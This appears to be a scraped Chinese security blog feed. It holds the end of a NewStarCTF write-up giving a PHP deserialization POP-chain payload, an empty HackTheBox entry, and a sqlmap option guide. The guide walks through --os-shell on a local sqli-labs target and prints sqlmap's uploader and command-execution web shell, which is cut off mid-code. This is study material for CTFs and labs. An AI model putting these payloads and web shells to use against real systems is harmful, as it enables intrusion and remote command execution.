<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">Start::__destruct</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__toString</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Easy::__call</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">eeee::__clone</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Start::__isset</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>于是<code>payload</code>为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$eeee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$eeee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//因为这里把eeee里的变量复制为实例化的Start的类，所以如果从eeee类为开始序列化的入口也是可以的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="comment">//echo serialize($eeee);</span></span><br></pre></td></tr></table></figure>

<p>得到序列化数据，<code>post</code>传入就行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;eeee&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;r:<span class="number">1</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;r:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;r:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022NewStarCTF/image-20221027162117156.png"><img src="/2022NewStarCTF/image-20221027162117156.png" alt="image-20221027162117156"></a></p>
<hr>
<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>htbのMachines</title>
    <url>/htb(Machines)/</url>
    <content><![CDATA[<p><code>Machines</code></p>
<span id="more"></span>

<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1><h2 id="【WEB】Analytics-easy"><a href="#【WEB】Analytics-easy" class="headerlink" title="【WEB】Analytics[easy]"></a>【WEB】Analytics[easy]</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
</blockquote>
]]></content>
      <categories>
        <category>Hack the Box</category>
      </categories>
      <tags>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用总结</title>
    <url>/tooluse(sqlmap)/</url>
    <content><![CDATA[<blockquote>
<p><code>原文作者: Ywc</code></p>
<p><code>原文链接: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/</code></p>
<p><code>发表日期: July 5th 2018, 1:20:40 pm</code></p>
<p><code>版权声明:</code></p>
</blockquote>
<span id="more"></span>

<h1 id="sqlmap使用总结"><a href="#sqlmap使用总结" class="headerlink" title="sqlmap使用总结"></a>sqlmap使用总结</h1><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><p><code>–version</code> 显示程序的版本号并退出<br><code>-h, –help</code> 显示此帮助消息并退出<br><code>-v VERBOSE</code> 详细级别：0-6（默认为1）</p>
<h3 id="Target-目标"><a href="#Target-目标" class="headerlink" title="Target(目标)"></a><strong>Target(目标)</strong></h3><p>以下至少需要设置其中一个选项，设置目标 URL。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-d DIRECT 直接连接到数据库。</span></span><br><span class="line"><span class="deletion">-u URL, –url=URL 目标 URL。</span></span><br><span class="line"><span class="deletion">-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。</span></span><br><span class="line"><span class="deletion">-r REQUESTFILE 从一个文件中载入 HTTP 请求。</span></span><br><span class="line"><span class="deletion">-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。</span></span><br><span class="line"><span class="deletion">-c CONFIGFILE 从 INI 配置文件中加载选项。</span></span><br></pre></td></tr></table></figure>

<h3 id="Request（请求）"><a href="#Request（请求）" class="headerlink" title="Request（请求）"></a><strong>Request（请求）</strong></h3><p>这些选项可以用来指定如何连接到目标URL。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">data</span>=DATA 通过 POST 发送的数据字符串</span><br><span class="line">–<span class="attribute">cookie</span>=COOKIE HTTP Cookie 头</span><br><span class="line">–cookie-urlencode URL 编码生成的 cookie 注入</span><br><span class="line">–drop-set-cookie 忽略响应的 <span class="built_in">Set</span> –Cookie 头信息</span><br><span class="line">–<span class="attribute">user-agent</span>=AGENT 指定 HTTP<span class="built_in"> User </span>–Agent 头</span><br><span class="line">–random-agent 使用随机选定的 HTTP User-Agent 头</span><br><span class="line">–<span class="attribute">referer</span>=REFERER 指定 HTTP Referer 头</span><br><span class="line">–<span class="attribute">headers</span>=HEADERS 换行分开，加入其他的 HTTP 头</span><br><span class="line">–<span class="attribute">auth-type</span>=ATYPE HTTP 身份验证类型（基本，摘要或NTLM）(Basic, Digest <span class="keyword">or</span> NTLM)</span><br><span class="line">–<span class="attribute">auth-cred</span>=ACRED HTTP 身份验证凭据（用户名:密码）</span><br><span class="line">–<span class="attribute">auth-cert</span>=ACERT HTTP 认证证书（key_file，cert_file）</span><br><span class="line">–<span class="attribute">proxy</span>=PROXY 使用 HTTP 代理连接到目标 URL</span><br><span class="line">–<span class="attribute">proxy-cred</span>=PCRED HTTP 代理身份验证凭据（用户名：密码）</span><br><span class="line">–ignore-proxy 忽略系统默认的 HTTP 代理</span><br><span class="line">–<span class="attribute">delay</span>=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒</span><br><span class="line">–<span class="attribute">timeout</span>=TIMEOUT 等待连接超时的时间（默认为30 秒）</span><br><span class="line">–<span class="attribute">retries</span>=RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line">–<span class="attribute">scope</span>=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line">–<span class="attribute">safe-url</span>=SAFURL 在测试过程中经常访问的 url 地址</span><br><span class="line">–<span class="attribute">safe-freq</span>=SAFREQ 两次访问之间测试请求，给出安全的 URL</span><br></pre></td></tr></table></figure>

<h3 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a><strong>Optimization（优化）</strong></h3><p>这些选项可用于优化 sqlmap.py 的性能。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line">-<span class="variable">o</span> 开启所有优化开关</span><br><span class="line">–<span class="variable">predict</span>-<span class="variable">output</span> 预测常见的查询输出</span><br><span class="line">–<span class="variable">keep</span>-<span class="variable">alive</span> 使用持久的 <span class="function"><span class="title">HTTP</span>(<span class="variable">S</span>) 连接</span></span><br><span class="line"><span class="function">–<span class="variable"><span class="literal">null</span></span>-<span class="variable">connection</span> 从没有实际的 <span class="variable">HTTP</span> 响应体中检索页面长度</span></span><br><span class="line"><span class="function">–<span class="variable">threads</span>=<span class="variable">THREADS</span> 最大的 <span class="title">HTTP</span>(<span class="variable">S</span>) 请求并发量（默认为<span class="number">1</span>）</span></span><br></pre></td></tr></table></figure>

<h3 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a><strong>Injection（注入）</strong></h3><p>这些选项可以用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER 可测试的参数</span><br><span class="line">–<span class="attribute">dbms</span>=DBMS 强制后端的 DBMS 为此值</span><br><span class="line">–<span class="attribute">os</span>=OS 强制后端的 DBMS 操作系统为这个值</span><br><span class="line">–<span class="attribute">prefix</span>=PREFIX 注入 payload 字符串前缀</span><br><span class="line">–<span class="attribute">suffix</span>=SUFFIX 注入 payload 字符串后缀</span><br><span class="line">–<span class="attribute">tamper</span>=TAMPER 使用给定的脚本篡改注入数据</span><br><span class="line">–tamper 通过编码绕过 WEB 防火墙（WAF）sqlmap.py 默认用 char()</span><br><span class="line">–tamper 插件所在目录\sqlmap-dev\tamper</span><br></pre></td></tr></table></figure>

<h3 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h3><p>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">level</span>=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–<span class="attribute">risk</span>=RISK 执行测试的风险（0-3，默认为 1）</span><br><span class="line">–<span class="attribute">string</span>=STRING 查询有效时在页面匹配字符串</span><br><span class="line">–<span class="attribute">regexp</span>=REGEXP 查询有效时在页面匹配正则表达式</span><br><span class="line">–text-only 仅基于文本内容比较网页</span><br></pre></td></tr></table></figure>

<p>这些选项可用于调整具体的 SQL 注入测试</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">–technique<span class="operator">=</span>TECH SQL 注入技术测试（默认 BEUST）</span><br><span class="line">Techniques（技巧）：</span><br><span class="line">–technique /*测试指定注入类型\使用的技术</span><br></pre></td></tr></table></figure>

<p>不加参数默认测试所有注入技术：</p>
<p>不加参数默认测试所有注入技术：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> 基于布尔的 SQL 盲注</span><br><span class="line"><span class="symbol">E:</span> 基于显错 sql 注入</span><br><span class="line"><span class="symbol">U:</span> 基于 UNION 注入</span><br><span class="line"><span class="symbol">S:</span> 叠层 sql 注入</span><br><span class="line"><span class="symbol">T:</span> 基于时间盲注</span><br></pre></td></tr></table></figure>



<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">time-sec</span>=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）</span><br><span class="line">–<span class="attribute">union-cols</span>=UCOLS 定列范围用于测试 UNION 查询注入</span><br><span class="line">–<span class="attribute">union-char</span>=UCHAR 用于暴力猜解列数的字符</span><br></pre></td></tr></table></figure>

<h3 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-f, –fingerprint 执行检查广泛的 DBMS 版本指纹</span></span><br></pre></td></tr></table></figure>

<h3 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">-b, –banner 检索数据库管理系统的标识</span><br><span class="line">–<span class="keyword">current</span>-<span class="keyword">user</span> 检索数据库管理系统当前用户</span><br><span class="line">–<span class="keyword">current</span>-db 检索数据库管理系统当前数据库</span><br><span class="line">–<span class="keyword">is</span>-dba 检测 DBMS 当前用户是否 DBA</span><br><span class="line">–users 枚举数据库管理系统用户</span><br><span class="line">–passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line">–<span class="keyword">privileges</span> 枚举数据库管理系统用户的权限</span><br><span class="line">–roles 枚举数据库管理系统用户的角色</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–<span class="keyword">tables</span> 枚举 DBMS 数据库中的表</span><br><span class="line">–<span class="keyword">columns</span> 枚举 DBMS 数据库表列</span><br><span class="line">–dump 转储数据库管理系统的数据库中的表项</span><br><span class="line">–dump-<span class="keyword">all</span> 转储所有的 DBMS 数据库表中的条目</span><br><span class="line">–<span class="keyword">search</span> 搜索列，表和/或数据库名称</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U <span class="keyword">USER</span> 用来进行枚举的数据库用户</span><br><span class="line">–<span class="keyword">exclude</span>-sysdbs 枚举表时排除系统数据库</span><br><span class="line">–start=LIMITSTART 第一个查询输出进入检索</span><br><span class="line">–stop=LIMITSTOP 最后查询的输出进入检索</span><br><span class="line">–first=FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line">–last=LASTCHAR 最后查询的输出字字符检索</span><br><span class="line">–<span class="keyword">sql</span>-query=QUERY 要执行的 <span class="keyword">SQL</span> 语句</span><br><span class="line">–<span class="keyword">sql</span>-shell 提示交互式 <span class="keyword">SQL</span> 的 shell</span><br></pre></td></tr></table></figure>

<h3 id="Brute-force-蛮力"><a href="#Brute-force-蛮力" class="headerlink" title="Brute force(蛮力)"></a>Brute force(蛮力)</h3><p>这些选项可以被用来运行蛮力检查。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">–<span class="meta">common</span>-tables 检查存在共同表</span><br><span class="line">–<span class="meta">common</span>-columns 检查存在共同列</span><br></pre></td></tr></table></figure>

<h3 id="User-defined-function-injection（用户自定义函数注入）"><a href="#User-defined-function-injection（用户自定义函数注入）" class="headerlink" title="User-defined function injection（用户自定义函数注入）"></a>User-defined function injection（用户自定义函数注入）</h3><p>这些选项可以用来创建用户自定义函数。</p>
<p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–udf-inject 注入用户自定义函数</span><br><span class="line">–<span class="attribute">shared-lib</span>=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>

<h3 id="File-system-access（访问文件系统）"><a href="#File-system-access（访问文件系统）" class="headerlink" title="File system access（访问文件系统）"></a>File system access（访问文件系统）</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<p>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">file-read</span>=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">–<span class="attribute">file-write</span>=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">–<span class="attribute">file-dest</span>=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>

<h3 id="Operating-system-access（操作系统访问）"><a href="#Operating-system-access（操作系统访问）" class="headerlink" title="[*]Operating system access（操作系统访问）"></a>[*]Operating system access（操作系统访问）</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">–<span class="built_in">os</span>-cmd=OSCMD 执行操作系统命令</span><br><span class="line">–<span class="built_in">os</span>-shell 交互式的操作系统的 shell</span><br><span class="line">–<span class="built_in">os</span>-pwn 获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line">–<span class="built_in">os</span>-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line">–<span class="built_in">os</span>-bof 存储过程缓冲区溢出利用</span><br><span class="line">–priv-esc 数据库进程用户权限提升</span><br><span class="line">–msf-<span class="built_in">path</span>=MSFPATH Metasploit Framework 本地的安装路径</span><br><span class="line">–tmp-<span class="built_in">path</span>=TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>

<h4 id="os-shell的使用"><a href="#os-shell的使用" class="headerlink" title="-os-shell的使用"></a><code>-os-shell</code>的使用</h4><p><a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></p>
<p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">https://blog.csdn.net/qq_61237064/article/details/124154956</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">使用前提</span><br><span class="line"></span><br><span class="line">拥有网站的写入权限</span><br><span class="line"></span><br><span class="line">Secure_file_priv参数为空或者为指定路径</span><br></pre></td></tr></table></figure>

<p>满足条件后</p>
<h4 id="1-注入"><a href="#1-注入" class="headerlink" title="1.注入"></a>1.注入</h4><p>先对注入点探测</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u http://<span class="number">127.0.0.1</span>/sqli-lab/less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(sqlmap)/image-20221112150328026.png"><img src="/tooluse(sqlmap)/image-20221112150328026.png" alt="image-20221112150328026"></a></p>
<p>然后执行<code>--os-shell</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u http://<span class="number">127.0.0.1</span>/sqli-lab/less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot; --os-shell</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(sqlmap)/image-20221112150107492.png"><img src="/tooluse(sqlmap)/image-20221112150107492.png" alt="image-20221112150107492"></a></p>
<p>选择php语言</p>
<p><a data-fancybox="gallery" data-src="/tooluse(sqlmap)/image-20221112151004965.png"><img src="/tooluse(sqlmap)/image-20221112151004965.png" alt="image-20221112151004965"></a></p>
<p>接着这个参数是选择绝对路径</p>
<p><a data-fancybox="gallery" data-src="/tooluse(sqlmap)/image-20221112151019786.png"><img src="/tooluse(sqlmap)/image-20221112151019786.png" alt="image-20221112151019786"></a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">选项一为用这几个路径</span><br><span class="line"></span><br><span class="line">选项二为用户自己输入</span><br><span class="line"></span><br><span class="line">选项三为用用户的字典</span><br><span class="line"></span><br><span class="line">选项四为爆破。</span><br></pre></td></tr></table></figure>

<p>我们满足前提的话，选择2，直接输入自己知道的路径</p>
<p><a data-fancybox="gallery" data-src="/tooluse(sqlmap)/image-20221112151155258.png"><img src="/tooluse(sqlmap)/image-20221112151155258.png" alt="image-20221112151155258"></a></p>
<p>到这就完成了<code>--os-shell</code>的执行，来看看在<code>sqlmap</code>的执行效果</p>
<p>对于上传的两个文件<code>tmpugvzq.php</code>和<code>tmpbylqf.php</code>我们在数据包中就可以看到，只需要解码就可以得到内容</p>
<p><code>tmpugvzq.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$dir</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>()&lt;<span class="string">&#x27;4.1.0&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>,<span class="number">0755</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\Users\\zhang\\Desktop\\php\\PHPTutorial\\WWW\\sqli-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据上面的<code>mysql</code>语句，不难看出这是利用<code>into outfile</code>写入文件</p>
<p><code>tmpbylqf.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span 